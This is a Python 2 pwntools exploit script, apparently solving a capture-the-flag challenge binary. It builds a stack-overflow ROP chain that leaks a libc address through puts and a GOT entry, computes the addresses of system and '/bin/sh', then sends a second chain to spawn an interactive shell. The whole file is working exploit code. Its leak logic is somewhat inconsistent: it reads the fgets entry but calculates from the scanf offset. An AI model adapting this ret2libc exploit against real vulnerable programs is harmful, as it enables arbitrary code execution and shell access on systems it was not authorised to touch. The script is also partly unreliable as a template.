#!/usr/bin/env python2

from pwn import *

libc = ELF('./libc-2.27.so')
b = ELF('./chall')

r = process('./chall')

payload = "A" * 254

addrmain = b.symbols['main']
pr = 0x0804901e #: pop ebx ; ret
gotscanf = b.got['fgets']
pltputs = b.symbols['puts']
padding="a"*268

ropchain = padding + p32(pltputs) + p32(pr) + p32(gotscanf) + p32(addrmain)

r.recvuntil('tise cette fois !\n\n')
r.sendline(ropchain)
leak = r.recv()

print leak
leak_scanf = u32(leak[-5:-1])
leak_system = leak_scanf - libc.symbols['__isoc99_scanf'] + libc.symbols['system']
leak_binsh = leak_scanf - libc.symbols['__isoc99_scanf'] + next(libc.search('/bin/sh\x00'))

ropchain=padding+p32(leak_system)+p32(pr)+p32(leak_binsh)
r.sendline(ropchain)

r.interactive()
